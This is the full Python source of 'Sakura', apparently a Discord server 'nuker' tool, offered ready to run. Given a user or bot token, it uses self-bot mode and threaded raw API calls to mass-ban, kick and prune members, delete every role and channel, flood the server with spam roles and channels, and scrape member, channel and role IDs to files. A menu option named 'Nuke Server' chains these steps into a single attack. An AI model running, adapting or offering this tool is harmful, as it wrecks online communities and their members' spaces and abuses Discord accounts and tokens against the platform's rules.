import discord, requests, asyncio, os, time, threading, sys
from pypresence import Presence
from colorama import Fore
from discord.ext import commands

os.system(f'cls & mode 61,22 & title [Sakura] - Configuration')
token = input(f"{Fore.LIGHTMAGENTA_EX}> {Fore.RESET}Token{Fore.LIGHTMAGENTA_EX}: {Fore.RESET}")
rpresence = input(f'[{Fore.LIGHTMAGENTA_EX}+{Fore.RESET}] Rich Presence (Y \ N){Fore.LIGHTMAGENTA_EX}: {Fore.RESET}')

def RichPresence():
    if rpresence.upper() == "y" or rpresence.lower() == "y":
        try:
            RPC = Presence("829084497655234571")
            RPC.connect()
            RPC.update(large_image="8",details="Cry with me?",buttons=[{"label":"Github","url":"https://github.com/7BZ"}],start=time.time())
        except:
            pass
rpresence = RichPresence()

def check_token():
    if requests.get("https://discord.com/api/v8/users/@me", headers={"Authorization": f'{token}'}).status_code == 200:
        return "user"
    else:
        return "bot"

check_token = check_token()
if check_token == "user":
	self_bot = True
	bot = False
else:
	self_bot = False
	bot = True

client = commands.Bot(command_prefix=">",self_bot=self_bot,intents=discord.Intents.all())
client.remove_command('help')

class Sakura:
	def __init__(self):
		pass

	def BanMembers(self, guild, member):
		while True:
			r = requests.put(f"https://discord.com/api/v8/guilds/{guild}/bans/{member}", headers={"Authorization": token})
			if 'retry_after' in r.text:
				time.sleep(r.json()['retry_after'])
			else:
				if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
					break
				else:
					break

	async def BE(self):
		guild = input(f"{Fore.LIGHTMAGENTA_EX}> {Fore.RESET}Guild ID{Fore.LIGHTMAGENTA_EX}: {Fore.RESET}")
		guildOBJ = client.get_guild(int(guild))
		members = await guildOBJ.chunk()
		for member in members:
			threading.Thread(target=self.BanMembers, args=(guild, member.id,)).start()

	def KickMembers(self, guild, member):
		while True:
			r = requests.delete(f"https://discord.com/api/v8/guilds/{guild}/members/{member}", headers={"Authorization": token})
			if 'retry_after' in r.text:
				time.sleep(r.json()['retry_after'])
			else:
				if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
					break
				else:
					break

	async def KE(self):
		guild = input(f"{Fore.LIGHTMAGENTA_EX}> {Fore.RESET}Guild ID{Fore.LIGHTMAGENTA_EX}: {Fore.RESET}")
		guildOBJ = client.get_guild(int(guild))
		members = await guildOBJ.chunk()
		for member in members:
			threading.Thread(target=self.KickMembers, args=(guild, member.id,)).start()

	async def PM(self):
		guildid = input(f"{Fore.LIGHTMAGENTA_EX}> {Fore.RESET}Guild ID{Fore.LIGHTMAGENTA_EX}: {Fore.RESET}")
		guild = client.get_guild(int(guildid))
		await guild.prune_members(days=1, compute_prune_count=False, roles=guild.roles)

	def DeleteRoles(self, guild, role):
		while True:
			r = requests.delete(f"https://discord.com/api/v8/guilds/{guild}/roles/{role}", headers={"Authorization": token})
			if 'retry_after' in r.text:
				time.sleep(r.json()['retry_after'])
			else:
				if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
					break
				else:
					break

	async def RD(self):
		guild = input(f"{Fore.LIGHTMAGENTA_EX}> {Fore.RESET}Guild ID{Fore.LIGHTMAGENTA_EX}: {Fore.RESET}")
		guildOBJ = client.get_guild(int(guild))

		for role in guildOBJ.roles:
			threading.Thread(target=self.DeleteRoles, args=(guild, role.id,)).start()

	def SpamRoles(self, guild, name):
		while True:
			json = {'name': name}
			r = requests.post(f'https://discord.com/api/v8/guilds/{guild}/roles', headers={"Authorization": token}, json=json)
			if 'retry_after' in r.text:
				time.sleep(r.json()['retry_after'])
			else:
				if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
					break
				else:
					break

	async def RS(self):
		guild = input(f"{Fore.LIGHTMAGENTA_EX}> {Fore.RESET}Guild ID{Fore.LIGHTMAGENTA_EX}: {Fore.RESET}")
		name = input(f"{Fore.LIGHTMAGENTA_EX}> {Fore.RESET}Role Names{Fore.LIGHTMAGENTA_EX}: {Fore.RESET}")
		amount = input(f"{Fore.LIGHTMAGENTA_EX}> {Fore.RESET}Amount{Fore.LIGHTMAGENTA_EX}: {Fore.RESET}")
		for i in range(int(amount)):
			threading.Thread(target=self.SpamRoles, args=(guild, name,)).start()

	def DeleteChannels(self, guild, channel):
		while True:
			r = requests.delete(f"https://discord.com/api/v8/channels/{channel}", headers={"Authorization": token})
			if 'retry_after' in r.text:
				time.sleep(r.json()['retry_after'])
			else:
				if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
					break
				else:
					break

	async def CD(self):
		guild = input(f"{Fore.LIGHTMAGENTA_EX}> {Fore.RESET}Guild ID{Fore.LIGHTMAGENTA_EX}: {Fore.RESET}")
		guildOBJ = client.get_guild(int(guild))
		for channel in guildOBJ.channels:
			threading.Thread(target=self.DeleteChannels, args=(guild, channel.id,)).start()

	def SpamChannels(self, guild, name):
		while True:
			r = requests.post(f'https://discord.com/api/v8/guilds/{guild}/channels',json={'name': name, 'type': 0},headers={"Authorization": token})
			if 'retry_after' in r.text:
				time.sleep(r.json()['retry_after'])
			else:
				if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
					break
				else:
					break

	async def CS(self):
		guild = input(f"{Fore.LIGHTMAGENTA_EX}> {Fore.RESET}Guild ID{Fore.LIGHTMAGENTA_EX}: {Fore.RESET}")
		name = input(f"{Fore.LIGHTMAGENTA_EX}> {Fore.RESET}Channel Names{Fore.LIGHTMAGENTA_EX}: {Fore.RESET}")
		amount = input(f"{Fore.LIGHTMAGENTA_EX}> {Fore.RESET}Amount{Fore.LIGHTMAGENTA_EX}: {Fore.RESET}")
		for i in range(int(amount)):
			threading.Thread(target=self.SpamChannels, args=(guild, name,)).start()

	async def NE(self):
		guild = input(f"{Fore.LIGHTMAGENTA_EX}> {Fore.RESET}Guild ID{Fore.LIGHTMAGENTA_EX}: {Fore.RESET}")
		channel_name = input(f"{Fore.LIGHTMAGENTA_EX}> {Fore.RESET}Channel Names{Fore.LIGHTMAGENTA_EX}: {Fore.RESET}")
		channel_amount = input(f"{Fore.LIGHTMAGENTA_EX}> {Fore.RESET}Channel Amount{Fore.LIGHTMAGENTA_EX}: {Fore.RESET}")
		role_name = input(f"{Fore.LIGHTMAGENTA_EX}> {Fore.RESET}Role Names{Fore.LIGHTMAGENTA_EX}: {Fore.RESET}")
		role_amount = input(f"{Fore.LIGHTMAGENTA_EX}> {Fore.RESET}Role Amount{Fore.LIGHTMAGENTA_EX}: {Fore.RESET}")
		guildOBJ = client.get_guild(int(guild))

		for member in guildOBJ.members:
			threading.Thread(target=self.BanMembers, args=(guild, member,)).start()
		for channel in guildOBJ.channels:
			threading.Thread(target=self.DeleteChannels, args=(guild, channel,)).start()
		for role in guildOBJ.roles:
			threading.Thread(target=self.DeleteRoles, args=(guild, role,)).start()
		for i in range(int(channel_amount)):
			threading.Thread(target=self.SpamChannels, args=(guild, channel_name,)).start()
		for i in range(int(role_amount)):
			threading.Thread(target=self.SpamRoles, args=(guild, role_name,)).start()

	async def Scrape(self):
		guild = input(f"{Fore.LIGHTMAGENTA_EX}> {Fore.RESET}Guild ID{Fore.LIGHTMAGENTA_EX}: {Fore.RESET}")
		guildOBJ = client.get_guild(int(guild))
		members = await guildOBJ.chunk()

		with open(f'Scrape/{guildOBJ.name}-members.txt', 'a') as m:
			for member in members:
				m.write(f'{member.id}\n')
			m.close()

		with open(f'Scrape/{guildOBJ.name}-channels.txt', 'a') as c:
			for channel in guildOBJ.channels:
				c.write(f"{channel.id}\n")
			c.close()

		with open(f'Scrape/{guildOBJ.name}-roles.txt', 'a') as r:
			for role in guildOBJ.roles:
				r.write(f"{role.id}\n")
			r.close()

	def Creds(self):
		print(f'''
[{Fore.LIGHTMAGENTA_EX}Github{Fore.RESET}] 7BZ''')

	async def Menu(self):
		os.system(f'cls & mode 61,22 & title [Sakura] - {client.user}')
		print(f'''{Fore.LIGHTMAGENTA_EX}
	                    __                   
	        _________ _/ /____  ___________ _
	       / ___/ __ `/ //_/ / / / ___/ __ `/
	      (__  ) /_/ / ,< / /_/ / /  / /_/ / 
	     /____/\__,_/_/|_|\__,_/_/   \__,_/  


      {Fore.LIGHTMAGENTA_EX}╔═══════════════════════╦═══════════════════════╗
      {Fore.LIGHTMAGENTA_EX}║ [{Fore.RESET}1{Fore.LIGHTMAGENTA_EX}] Ban Members       {Fore.LIGHTMAGENTA_EX}║ {Fore.LIGHTMAGENTA_EX}[{Fore.RESET}7{Fore.LIGHTMAGENTA_EX}] Create Channels   {Fore.LIGHTMAGENTA_EX}║
      {Fore.LIGHTMAGENTA_EX}║ [{Fore.RESET}2{Fore.LIGHTMAGENTA_EX}] Kick Members      {Fore.LIGHTMAGENTA_EX}║ {Fore.LIGHTMAGENTA_EX}[{Fore.RESET}8{Fore.LIGHTMAGENTA_EX}] Nuke Server       {Fore.LIGHTMAGENTA_EX}║
      {Fore.LIGHTMAGENTA_EX}║ [{Fore.RESET}3{Fore.LIGHTMAGENTA_EX}] Prune Members     {Fore.LIGHTMAGENTA_EX}║ {Fore.LIGHTMAGENTA_EX}[{Fore.RESET}9{Fore.LIGHTMAGENTA_EX}] Scrape Info       {Fore.LIGHTMAGENTA_EX}║
      {Fore.LIGHTMAGENTA_EX}║ [{Fore.RESET}4{Fore.LIGHTMAGENTA_EX}] Delete Roles      {Fore.LIGHTMAGENTA_EX}║ {Fore.LIGHTMAGENTA_EX}[{Fore.RESET}C{Fore.LIGHTMAGENTA_EX}] View Credits      {Fore.LIGHTMAGENTA_EX}║
      {Fore.LIGHTMAGENTA_EX}║ [{Fore.RESET}5{Fore.LIGHTMAGENTA_EX}] Delete Channels   {Fore.LIGHTMAGENTA_EX}║ {Fore.LIGHTMAGENTA_EX}[{Fore.RESET}X{Fore.LIGHTMAGENTA_EX}] Exit              {Fore.LIGHTMAGENTA_EX}║
      {Fore.LIGHTMAGENTA_EX}║ [{Fore.RESET}6{Fore.LIGHTMAGENTA_EX}] Create Roles      {Fore.LIGHTMAGENTA_EX}║ {Fore.LIGHTMAGENTA_EX}Sakura                ║
      {Fore.LIGHTMAGENTA_EX}╚═══════════════════════╩═══════════════════════╝
{Fore.RESET}''')
		choice = input(f"{Fore.LIGHTMAGENTA_EX}> {Fore.RESET}Choice{Fore.LIGHTMAGENTA_EX}: {Fore.RESET}")
		if choice == "1":
			await self.BE()
			time.sleep(2)
			await self.Menu()
		elif choice == "2":
			await self.KE()
			time.sleep(2)
			await self.Menu()
		elif choice == "3":
			await self.PM()
			time.sleep(2)
			await self.Menu()
		elif choice == "4":
			await self.RD()
			time.sleep(2)
			await self.Menu()
		elif choice == "5":
			await self.CD()
			time.sleep(2)
			await self.Menu()
		elif choice == "6":
			await self.RS()
			time.sleep(2)
			await self.Menu()
		elif choice == "7":
			await self.CS()
			time.sleep(2)
			await self.Menu()
		elif choice == "8":
			await self.NE()
			time.sleep(2)
			await self.Menu()
		elif choice == "9":
			await self.Scrape()
			time.sleep(2)
			await self.Menu()
		elif choice.lower() == "c" or choice.upper() == "c":
			self.Creds()
			time.sleep(2)
			await self.Menu()
		elif choice.lower() == "x" or choice.upper() == "x":
			sys.exit()
		else:
			time.sleep(2)
			await self.Menu()

@client.event
async def on_ready():
	await Sakura().Menu()
try:
	client.run(token,bot=bot)
except:
	sys.exit()